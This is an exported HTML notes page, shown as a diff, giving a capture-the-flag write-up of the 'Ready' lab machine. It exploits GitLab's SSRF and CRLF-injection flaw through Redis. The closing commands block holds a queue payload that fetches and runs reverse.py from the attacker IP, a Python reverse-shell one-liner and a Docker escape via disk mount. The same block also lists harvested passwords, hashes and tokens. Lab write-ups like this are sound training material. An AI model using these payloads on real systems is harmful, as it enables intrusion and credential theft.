@@ -1,0 +1,700 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Ready</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, YuMincho, "Yu Mincho", "Hiragino Mincho ProN", "Hiragino Mincho Pro", "Songti TC", "Songti SC", "SimSun", "Nanum Myeongjo", NanumMyeongjo, Batang, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }
+
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }
+
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, YuMincho, "Yu Mincho", "Hiragino Mincho ProN", "Hiragino Mincho Pro", "Songti TC", "Songti SC", "SimSun", "Nanum Myeongjo", NanumMyeongjo, Batang, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }
+
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }
+
+.highlight-default {
+}
+.highlight-gray {
+	color: rgb(155,154,151);
+}
+.highlight-brown {
+	color: rgb(100,71,58);
+}
+.highlight-orange {
+	color: rgb(217,115,13);
+}
+.highlight-yellow {
+	color: rgb(223,171,1);
+}
+.highlight-teal {
+	color: rgb(15,123,108);
+}
+.highlight-blue {
+	color: rgb(11,110,153);
+}
+.highlight-purple {
+	color: rgb(105,64,165);
+}
+.highlight-pink {
+	color: rgb(173,26,114);
+}
+.highlight-red {
+	color: rgb(224,62,62);
+}
+.highlight-gray_background {
+	background: rgb(235,236,237);
+}
+.highlight-brown_background {
+	background: rgb(233,229,227);
+}
+.highlight-orange_background {
+	background: rgb(250,235,221);
+}
+.highlight-yellow_background {
+	background: rgb(251,243,219);
+}
+.highlight-teal_background {
+	background: rgb(221,237,234);
+}
+.highlight-blue_background {
+	background: rgb(221,235,241);
+}
+.highlight-purple_background {
+	background: rgb(234,228,242);
+}
+.highlight-pink_background {
+	background: rgb(244,223,235);
+}
+.highlight-red_background {
+	background: rgb(251,228,228);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(55, 53, 47, 0.6);
+	fill: rgba(55, 53, 47, 0.6);
+}
+.block-color-brown {
+	color: rgb(100,71,58);
+	fill: rgb(100,71,58);
+}
+.block-color-orange {
+	color: rgb(217,115,13);
+	fill: rgb(217,115,13);
+}
+.block-color-yellow {
+	color: rgb(223,171,1);
+	fill: rgb(223,171,1);
+}
+.block-color-teal {
+	color: rgb(15,123,108);
+	fill: rgb(15,123,108);
+}
+.block-color-blue {
+	color: rgb(11,110,153);
+	fill: rgb(11,110,153);
+}
+.block-color-purple {
+	color: rgb(105,64,165);
+	fill: rgb(105,64,165);
+}
+.block-color-pink {
+	color: rgb(173,26,114);
+	fill: rgb(173,26,114);
+}
+.block-color-red {
+	color: rgb(224,62,62);
+	fill: rgb(224,62,62);
+}
+.block-color-gray_background {
+	background: rgb(235,236,237);
+}
+.block-color-brown_background {
+	background: rgb(233,229,227);
+}
+.block-color-orange_background {
+	background: rgb(250,235,221);
+}
+.block-color-yellow_background {
+	background: rgb(251,243,219);
+}
+.block-color-teal_background {
+	background: rgb(221,237,234);
+}
+.block-color-blue_background {
+	background: rgb(221,235,241);
+}
+.block-color-purple_background {
+	background: rgb(234,228,242);
+}
+.block-color-pink_background {
+	background: rgb(244,223,235);
+}
+.block-color-red_background {
+	background: rgb(251,228,228);
+}
+.select-value-color-default { background-color: rgba(206,205,202,0.5); }
+.select-value-color-gray { background-color: rgba(155,154,151, 0.4); }
+.select-value-color-brown { background-color: rgba(140,46,0,0.2); }
+.select-value-color-orange { background-color: rgba(245,93,0,0.2); }
+.select-value-color-yellow { background-color: rgba(233,168,0,0.2); }
+.select-value-color-green { background-color: rgba(0,135,107,0.2); }
+.select-value-color-blue { background-color: rgba(0,120,223,0.2); }
+.select-value-color-purple { background-color: rgba(103,36,222,0.2); }
+.select-value-color-pink { background-color: rgba(221,0,129,0.2); }
+.select-value-color-red { background-color: rgba(255,0,26,0.2); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="a81967e7-51aa-415c-be58-d452dd3038ac" class="page sans"><header><h1 class="page-title">Ready</h1></header><div class="page-body"><figure id="3898d80d-d197-40d8-a157-a04d052e2389" class="image"><a href="Ready%203898d80dd19740d8a157a04d052e2389/Untitled.png"><img style="width:706px" src="Ready%203898d80dd19740d8a157a04d052e2389/Untitled.png"/></a></figure><p id="bd8b2f0b-a9ac-477e-98b9-ed0f44bb483e" class="">Starting with port scan nmap, it found 2 ports.</p><figure id="b7084891-4229-41e9-830a-9f537535f50c" class="image"><a href="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%201.png"><img style="width:785px" src="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%201.png"/></a></figure><p id="b75d0388-e169-4342-8666-053ab6282c92" class="">Performing web directory scan :</p><figure id="a2df1dc9-ce29-46ca-bc5d-2411e32e7bf2" class="image"><a href="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%202.png"><img style="width:950px" src="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%202.png"/></a></figure><p id="f321d355-a6c1-47a7-848e-e53644e0c81f" class="">
+We can make a SSRF using Web Hooks parse IPV6 using vulnerability <mark class="highlight-blue">Gitlab remote code execution.</mark></p><p id="b05c941e-9160-4517-9418-5e4df09cf8f5" class=""><a href="https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/">https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/</a></p><p id="66ed8b43-be3d-4fac-bd05-bd681ff00779" class="">Note that, the version of git lab is the same version of CVE.</p><figure id="8eebc170-d85b-4f6f-92fd-89d4a46d23d1" class="image"><a href="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%203.png"><img style="width:1310px" src="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%203.png"/></a></figure><p id="e707f2a1-d192-4811-a1e7-48ee93f42ecf" class="">Import a new project with git repo url and make request using .get, if that doesn&#x27;t work, try using other methods written in CVE.</p><figure id="a97644a0-6f7c-4d62-bef3-99e6212d063e" class="image"><a href="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%204.png"><img style="width:1821px" src="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%204.png"/></a></figure><p id="6cadd641-5063-4c86-acef-35be21df4c57" class="">Making request using .get we received the connection.</p><pre id="03d0f689-f93b-469c-81fb-ece4d3ee270a" class="code"><code>git://10.10.10.14.185:8881/%0D%0Atest%0D%0Ablah.git</code></pre><figure id="8fa320f3-cb2e-46d9-ba5a-bd1cbffc7519" class="image"><a href="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%205.png"><img style="width:1763px" src="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%205.png"/></a></figure><p id="c2885634-e82d-4d2b-83e7-cf8e7b379553" class="">We can add newlines using the CRLF injection and move on into creating a payload for the RCE.</p><p id="6d519b8d-bcd3-4259-8471-ec5b9d961c12" class="">So prepare your burp suite to intercept requisitions. </p><figure id="912593b3-6020-4f65-a9f9-40d87154b76d" class="image"><a href="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%206.png"><img style="width:1830px" src="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%206.png"/></a></figure><p id="69333772-75bd-4ece-9724-d4a9100dcb40" class="">Change names and try again to verify repeater.</p><figure id="081fb9ec-a6f0-4494-ac58-014695cef84e" class="image"><a href="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%207.png"><img style="width:1820px" src="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%207.png"/></a></figure><p id="09cec249-fcd9-44fc-bb2e-da0060989554" class="">Now let&#x27;s try  reverse-shell payload, just wait a short time to receive the connection.</p><p id="b6c530a2-abd9-42c7-936d-35d2661f12c6" class="">Create python reverse shell code and start python server to perform wget in the machine.</p><p id="cb28081d-1032-477d-a4ee-35bb21e1b023" class="">In the local of the script:</p><pre id="a5357765-c2dd-45f5-b879-650cdbbf1a8e" class="code"><code>python3 -m http.server PORT</code></pre><figure id="cdbb3644-7b00-460e-a390-8421aa64353f" class="image"><a href="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%208.png"><img style="width:1716px" src="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%208.png"/></a></figure><h3 id="0b39849f-9209-45c5-94f8-4df528eea261" class=""><mark class="highlight-blue">Let&#x27;s to privilege escalation</mark></h3><p id="ece310e1-87cd-4b44-b703-cfbf8819f3ef" class="">Getting shell full tty:</p><figure id="8c01bda7-a9e1-43c4-86b5-69d16d285b72" class="image"><a href="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%209.png"><img style="width:946px" src="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%209.png"/></a></figure><p id="d9f75a2a-2476-4ec2-9d27-fe95beecb75d" class="">Script that the machine get in request →</p><figure id="6e23f74a-6407-47e2-9da0-7a6fa755b92c" class="image"><a href="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%2010.png"><img style="width:720px" src="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%2010.png"/></a></figure><p id="d66583c6-8ff4-472b-af2a-f56a05d50fe1" class="">User flag in dude home folder.</p><figure id="8f37fd8e-d4f4-4a51-98dc-77f8a41d6876" class="image"><a href="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%2011.png"><img style="width:993px" src="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%2011.png"/></a></figure><p id="02b5c5da-b24b-448d-8856-da470f94626b" class="">Don&#x27;t exists sudo -l command, the system is Linux Gitlab ubuntu  5.4.0.</p><figure id="51f54196-c722-4cbb-a994-1207a40dd7fc" class="image"><a href="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%2012.png"><img style="width:963px" src="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%2012.png"/></a></figure><p id="0ef10c79-ccb2-4011-9b41-d752f2e4b272" class="">Searching i found this archive localized at <mark class="highlight-blue">/opt/backup/docker-compose.yml.</mark> This file contains critical information about the server.</p><figure id="63c2a66e-895a-48a8-8fd3-a9160d6f2e24" class="image"><a href="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%2013.png"><img style="width:933px" src="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%2013.png"/></a></figure><p id="d6933352-73c8-42f3-8051-f1cbe3ccf9a0" class="">Possible ways to privele escalation</p><p id="5ddba21e-cc7c-4374-820d-56c8ac55275e" class=""><a href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis">https://book.hacktricks.xyz/pentesting/6379-pentesting-redis</a></p><p id="49781030-a5b4-499c-8805-975eb503eedb" class=""><a href="https://redis.io/">https://redis.io/</a></p><h3 id="628ca4fb-74c2-4002-a07a-6151495d0b33" class=""><mark class="highlight-blue">Entering in database Gitlab</mark></h3><figure id="445e34ea-0aa1-4365-aeb3-d21a47a348f1" class="image"><a href="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%2014.png"><img style="width:421px" src="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%2014.png"/></a></figure><figure id="fa59d872-b0b7-47bc-9649-ad135c82cfcf" class="image"><a href="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%2015.png"><img style="width:760px" src="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%2015.png"/></a></figure><p id="b3f62b00-4079-4cba-9b07-6bd138372b21" class="">Commands to navigate in database.</p><pre id="e93afb5d-6a75-40e1-8719-0b935fc9e6d7" class="code"><code>\l - list databases
+\dt - connect
+SELECT * FROM name;
+</code></pre><figure id="fc51b80e-f47b-4e5a-9266-f2e2ac20127d" class="image"><a href="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%2016.png"><img style="width:1073px" src="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%2016.png"/></a></figure><p id="4a28f4a1-091d-4f93-905f-f5fb122f6122" class="">Blowfish is hard difficult to crack.</p><p id="b452ab1c-cbeb-4b3d-9dd3-a483955832d6" class="">Analyzing my annotations i tried use the smtp_password and work with success login in root account. </p><p id="479d8883-15d8-410b-9877-e948b0217bbf" class="">The password are available at <mark class="highlight-blue">/opt/backup/gitlab.rb.</mark></p><figure id="ab118227-3892-4d1a-9a4d-20a1236e90a3" class="image"><a href="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%2017.png"><img style="width:746px" src="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%2017.png"/></a></figure><p id="84ec769b-ceb8-48b2-8a2f-d3f76b148265" class="">Create temp root folder and mount sda2 in it.</p><pre id="d6bff1c8-4768-4291-a7d4-be6487302e74" class="code"><code>mkdir /tmp/root 
+mount /dev/sda2 /tmp/root
+cat /tmp/root/root.txt</code></pre><figure id="120d6db3-1651-4405-9e04-92f69d0a7712" class="image"><a href="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%2018.png"><img style="width:943px" src="Ready%203898d80dd19740d8a157a04d052e2389/Untitled%2018.png"/></a></figure><h3 id="5adf5259-e936-41be-b86a-e218201bef3d" class="">Commands</h3><pre id="2c6ccbef-b953-4099-8c13-52d135c80207" class="code"><code>10.10.10.220 
+git://[0:0:0:0:0:ffff:10.10.14.185]:8881/%0D%0Atest%0D%0Ablah.git
+git://[0:0:0:0:0:ffff:127.0.0.1]:6379/test/srrf.git
+stresser
+
+ multi
+ sadd resque:gitlab:queues system_hook_push
+ lpush resque:gitlab:queue:system_hook_push &quot;{\&quot;class\&quot;:\&quot;GitlabShellWorker\&quot;,\&quot;args\&quot;
+:[\&quot;class_eval\&quot;,\&quot;open(\&#x27;|whoami |wget http://10.10.14.185:7773/reverse.py |python3 
+reverse.py|python reverse.py&#x27;).read\&quot;],\&quot;retry\&quot;:3,\&quot;queue\&quot;:\&quot;system_hook_push\&quot;,\&quot;jid\&quot;
+:\&quot;ad52abc5641173e217eb2e52\&quot;,\&quot;created_at\&quot;:1513714403.8122594,\&quot;enqueued_at\&quot;:1513714403
+.8129568}&quot;
+
+ exec
+ exec
+ exec
+
+python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect((&quot;10.10.14.185&quot;,7773));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2
+(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;
+
+gitlab/gitlab-rails/production.log:Started GET &quot;/recoverpassword&quot; for 10.10.14.185 at 
+2021-04-26 17:36:04 +0000
+gitlab/gitlab-rails/production.log:  Parameters: {&quot;utf8&quot;=&gt;&quot;✓&quot;, &quot;authenticity_token&quot;=&gt;
+&quot;[FILTERED]&quot;, &quot;new_user&quot;=&gt;{&quot;name&quot;=&gt;&quot;admin&quot;, &quot;username&quot;=&gt;&quot;admina&quot;, 
+&quot;email&quot;=&gt;&quot;admin@admin.con&quot;, &quot;email_confirmation&quot;=&gt;&quot;admin@admin.con&quot;, 
+&quot;password&quot;=&gt;&quot;[FILTERED]&quot;}}
+
+===========================================================================================
+PATH variables
+/opt/gitlab/embedded/lib/ruby/gems/2.4.0/bin
+/opt/gitlab/bin
+/opt/gitlab/embedded/bin
+
+root@599cf120c7bc
+
+DATABASES
+postgreSQL
+
+/var/opt/gitlab/postgresql/data
+/var/opt/gitlab/postgresql&quot;
+gitlab-psql
+gitlab_rails[&#x27;smtp_password&#x27;] = &quot;wW59U!ZKMbG9+*#h&quot;
+mattermost
+# mattermost[&#x27;sql_data_source&#x27;] = &quot;mmuser:mostest@tcp(dockerhost:3306)/mattermost_test?
+charset=utf8mb4,utf8&quot;
+
+YG65407Bjqvv9A0a8Tm_7w
+volumes:
+      - &#x27;./srv/gitlab/config:/etc/gitlab&#x27;
+      - &#x27;./srv/gitlab/logs:/var/log/gitlab&#x27;
+      - &#x27;./srv/gitlab/data:/var/opt/gitlab&#x27;
+      - &#x27;./root_pass:/root_pass&#x27;
+/var/opt/gitlab/redis/redis.conf
+===========================================================================================
+DB USERS
+Administrator
+email                                        | admin@example.com
+encrypted_password                           | $2a$10$zzun9kmrHMdwsJZKTmwn9OZddFjwrhbaXx
+																								3b2eb9l2g.1LrjZo0V2
+username 										root
+notification_email                           | admin@example.com
+
+incoming_email_token                         | 64e48z64oohhrqhlgfkqmlgxg
+
+/opt/gitlab/embedded/bin/redis-server</code></pre><p id="cab69285-98e7-4289-91d0-c92c41c0f673" class="">References
+<a href="https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/">https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/</a><a href="https://docs.gitlab.com/omnibus/settings/database.html">https://docs.gitlab.com/omnibus/settings/database.html</a><a href="https://www.w3resource.com/PostgreSQL/connect-to-postgresql-database.php">https://www.w3resource.com/PostgreSQL/connect-to-postgresql-database.php</a><a href="https://chartio.com/resources/tutorials/how-to-list-databases-and-tables-in-postgresql-using-psql/">https://chartio.com/resources/tutorials/how-to-list-databases-and-tables-in-postgresql-using-psql/</a><a href="https://docs.gitlab.com/ee/administration/operations/rails_console.html">https://docs.gitlab.com/ee/administration/operations/rails_console.html</a><a href="https://www.postgresqltutorial.com/postgresql-show-tables/">https://www.postgresqltutorial.com/postgresql-show-tables/</a></p></div></article></body></html>
